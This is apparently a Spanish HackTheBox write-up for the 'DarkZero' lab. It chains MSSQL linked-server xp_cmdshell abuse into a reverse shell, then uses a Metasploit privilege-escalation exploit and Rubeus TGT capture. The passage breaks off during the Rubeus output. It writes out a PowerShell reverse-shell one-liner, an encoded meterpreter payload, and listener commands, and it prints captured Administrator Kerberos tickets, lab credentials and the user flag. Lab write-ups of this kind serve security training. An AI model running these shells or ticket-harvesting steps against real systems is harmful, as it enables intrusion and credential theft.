---
hidden: true
icon: flag
---

# DarkZero HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 04:40 EDT
Nmap scan report for 10.10.11.89
Host is up (0.031s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-06 15:40:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-06T15:42:15+00:00; +7h00m00s from scanner time.
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.89:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-06T15:03:52
|_Not valid after:  2055-10-06T15:03:52
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49908/tcp open  msrpc         Microsoft Windows RPC
49931/tcp open  msrpc         Microsoft Windows RPC
49964/tcp open  msrpc         Microsoft Windows RPC
50041/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-06T15:41:37
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.73 seconds
```

Veremos varios puertos interesantes, pero entre ellos veremos un nombre de `dominio` llamado `DC01.darkzero.htb` el cual nos vamos a guardar por si nos hiciera falta añadirlo en nuestro archivo `hosts`, pero si analizamos un poco mejor veremos el puerto `ms-sql-s` que es una `DDBB`, tambien en la informacion de la maquina veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-06 104759.png" alt=""><figcaption></figcaption></figure>

En `HTB` por lo que ya por defecto tendremos unas credenciales, si las probamos por `ms-sql-s` veremos lo siguiente:

```shell
impacket-mssqlclient john.w@<IP> -windows-auth
```

Metemos como contraseña `RFulUtONCOL!`...

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

Veremos que estaremos dentro, pero antes vamos a probar a sacar un poco mas de informacion respecto a la maquina victima mediante los `DNS` y demas informacion.

### Exfiltración DNS

Vamos añadir a nuestro archivo `hosts` lo siguiente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           darkzero.htb DC01.darkzero.htb
```

Lo guardamos y ejecutamos lo siguiente:

```shell
dig @DC01.darkzero.htb ANY darkzero.htb
```

Info:

```
; <<>> DiG 9.20.11-4+b1-Debian <<>> @DC01.darkzero.htb ANY darkzero.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59436
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;darkzero.htb.                  IN      ANY

;; ANSWER SECTION:
darkzero.htb.           600     IN      A       172.16.20.1
darkzero.htb.           600     IN      A       10.10.11.89
darkzero.htb.           3600    IN      NS      dc01.darkzero.htb.
darkzero.htb.           3600    IN      SOA     dc01.darkzero.htb. hostmaster.darkzero.htb. 435 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.darkzero.htb.      3600    IN      A       172.16.20.1
dc01.darkzero.htb.      3600    IN      A       10.10.11.89

;; Query time: 32 msec
;; SERVER: 10.10.11.89#53(DC01.darkzero.htb) (TCP)
;; WHEN: Mon Oct 06 04:56:27 EDT 2025
;; MSG SIZE  rcvd: 171
```

Veremos informacion interesante, pero nada fuera de lo normal, vamos a seguir en la `shell` que tenemos en `mssqlclient` a ver que encontramos.

> Ya que hemos añadido el dominio a nuestro archivo hosts, podremos conectarnos por `mssqlclient` de esta forma:

```shell
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@<IP>' -windows-auth
```

Nosotros estando dentro de la `shell` interactiva despues de un rato de `fuzzing` probe este comando por si estuviera habilitado el `xp_dirtree` y me funciono.

```mysql
EXEC xp_dirtree 'C:\\', 1, 1;
```

Info:

```
subdirectory                depth   file   
-------------------------   -----   ----   
$RECYCLE.BIN                    1      0   

$WinREAgent                     1      0   

Documents and Settings          1      0   

inetpub                         1      0   

machine                         1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

Recovery                        1      0   

System Volume Information       1      0   

Users                           1      0   

Windows                         1      0   

Windows.old                     1      0 
```

Veremos que nos lista la carpeta `C:\`, por lo que vamos a probar a investigar la herramienta `xp_...` para intentar realizar un `RCE` desde esta `DDBB`.

Si probamos a ver si hay `links` a otras `DDBBs` veremos lo siguiente:

```mysql
enum_links
```

Info:

```
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

Vemos que hay un `DC02` `linkeada`, vamos a probar como podriamos interactuar con ella.

Si probamos a obtener la version de la `DDBB` de esta forma con el `AT`:

```mysql
EXECUTE ('SELECT @@version') AT [DC02.darkzero.ext];
```

Info:

```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
        Oct  8 2022 05:58:25 
        Copyright (C) 2022 Microsoft Corporation
        Enterprise Evaluation Edition (64-bit) on Windows Server 2022 Datacenter 10.0 <X64> (Build 20348: ) (Hypervisor)
```

Veremos que funciona, por lo que vamos a probar a ver los permisos de dicha `DDBB` a ver si esta habilitado con `AT` la funcion de `xp_cmdshell` de esta forma:

```mysql
EXECUTE ('EXEC sp_configure ''xp_cmdshell''') AT [DC02.darkzero.ext];
```

Info:

```
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1
```

Veremos que efectivamente esta habilitado, por lo que vamos a probar a realizar `RCE` de esta forma:

```mysql
EXECUTE ('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
```

Info:

```
output                 
--------------------   
darkzero-ext\svc_sql   

NULL
```

Vemos que funciona todo bien, vamos a realizar una `reverse shell` haciendo lo siguiente:

```mysql
EXECUTE ('EXEC xp_cmdshell ''powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''''<IP>'''',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''''PS '''' + (pwd).Path + ''''› '''';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''') AT [DC02.darkzero.ext];
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos lo de antes y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.66] from (UNKNOWN) [10.10.11.89] 52509
whoami
darkzero-ext\svc_sql
PS C:\Windows\system32?
```

Veremos que ha funcionado, obtendremos una `shell` como el usuario `svc_sql`, pero mejor en vez de tener esta `shell` tan pobre, vamos a obtenerla desde `metasploit` de esta forma:

### Metasploit Shell

Vamos a generar el `payload` de la `shell`:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-cmd
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh-cmd file: 7591 bytes
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAc......<RESTO DE BASE64>
```

Ahora vamos a enviarlo desde la `DDBB` con el `xp_cmdshell`:

```mysql
EXECUTE ('EXEC xp_cmdshell ''powershell -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEAL....<RESTO DE BASE64>''') AT [DC02.darkzero.ext];
```

Pero antes de enviarlo, vamos a ponernos a la escucha por `metasploit` de esta forma:

```shell
msfconsole -q
```

Estando dentro vamos a configurarlo de esta forma:

```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT <PORT>
run
```

Info:

```
[*] Started reverse TCP handler on 10.10.14.66:7755
```

Ahora que estamos a la escucha, si enviamos el `payload` anterior por la `DDBB` y volvemoa a donde tenemos la escucha de `metasploit` veremos lo siguiente:

```
[*] Started reverse TCP handler on 10.10.14.66:7755 
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 1 opened (10.10.14.66:7755 -> 10.10.11.89:52508) at 2025-10-06 05:40:04 -0400

meterpreter > getuid
Server username: darkzero-ext\svc_sql
```

Vemos que ha funcionado, por lo que tendremos una `shell` mucho mejor, ahora vamos a realizar una enumeracion de escalada de privilegios con el modulo llamado `suggester` de `metasploit`.

```shell
background
```

Con esto dejaremos la sesion en segundo plano, ahora configuraremos el modulo de esta forma:

```shell
sessions -l
```

Info:

```
Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.14.66:7755 -> 10.10.11.89:52508 (172.16.20.2)
```

```shell
use post/multi/recon/local_exploit_suggester
set SESSION <NUMBER_SESSION>
run
```

Info:

```
[*] 172.16.20.2 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 172.16.20.2 - 206 exploit checks are being tried...
[+] 172.16.20.2 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 172.16.20.2 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30085_cloud_files: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[+] 172.16.20.2 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 172.16.20.2 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 49 / 49
[*] 172.16.20.2 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022                                                                                                         
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                                     
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113                                                                                                                   
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022                                                                                                                        
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 ..............................<RESTO DE INFO>.....................................
```

Veremos que tenemos `9` posibles `exploits` para escalar privilegios dentro de la sesion, vamos a probar con `exploit/windows/local/cve_2024_30088_authz_basep` que en la descripcion parece que se adapta mas al `windows` que estamos utilizando como maquina victima.

```shell
use exploit/windows/local/cve_2024_30088_authz_basep
set LHOST tun0
set LPORT <PORT>
set AutoCheck false
exploit
```

Info:

```
[*] Started reverse TCP handler on 10.10.14.69:9999 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Reflectively injecting the DLL into 3728...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 2272
[+] Successfully retrieved winlogon pid: 592
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 20 opened (10.10.14.69:9999 -> 10.10.11.89:59537) at 2025-10-09 06:49:50 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Veremos que ha funcionado, despues de estar casi `3` dias intentandolo, por lo que veo es una `race condition`, tienes que tener suerte para que te otorgue la `shell`, pero despues de muchisimos intentos funciono.

Por lo que vamos a leer la `flag` del usuario.

> user.txt

```
c191d7a05913ea8d611b341542540c10
```

## Escalate Privileges

Vamos a probar a obtener el `NTLM` del usuario `administrador` a ver si funciona, primero tendremos que obtener el `TGT` del usuario `DC01` que es el que esta en el `dominio` real y no en un contenedor aislado.

Vamos a descargarnos `Rubeus.exe` para monitorizar los `TGTs` que estan pasando por la maquina en ese momento, para ello nos iremos a este repo.

URL = [Rubeus GitHub Download](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

Nos descargamos eso desde nuestra maquina atacante y desde el `meterpreter` donde tenemos nuestra `shell` como `NT` vamos a poner lo siguiente:

```shell
cd C:/Windows/Temp
upload Rubeus.exe
```

Info:

```
[*] Uploading  : /home/kali/Desktop/darkzero/Rubeus.exe -> Rubeus.exe
[*] Uploaded 436.50 KiB of 436.50 KiB (100.0%): /home/kali/Desktop/darkzero/Rubeus.exe -> Rubeus.exe
[*] Completed  : /home/kali/Desktop/darkzero/Rubeus.exe -> Rubeus.exe
```

## Captura de TGT

Una vez que lo hayamos llevado a la carpeta `temporal` de `Windows` vamos a estar monitorizando los `TGTs` a ver si vemos algo interesante.

```shell
shell
.\Rubeus.exe monitor /interval:1 /nowrap
```

Info:

```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs


[*] 10/9/2025 6:06:09 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/9/2025 11:05:20 AM
  EndTime               :  10/9/2025 9:05:20 PM
  RenewTill             :  10/16/2025 11:05:20 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/9/2025 6:06:09 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/9/2025 10:52:16 AM
  EndTime               :  10/9/2025 8:52:16 PM
  RenewTill             :  10/16/2025 10:52:16 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/9/2025 6:06:09 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/9/2025 10:52:04 AM
  EndTime               :  10/9/2025 8:52:04 PM
  RenewTill             :  10/16/2025 10:52:04 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

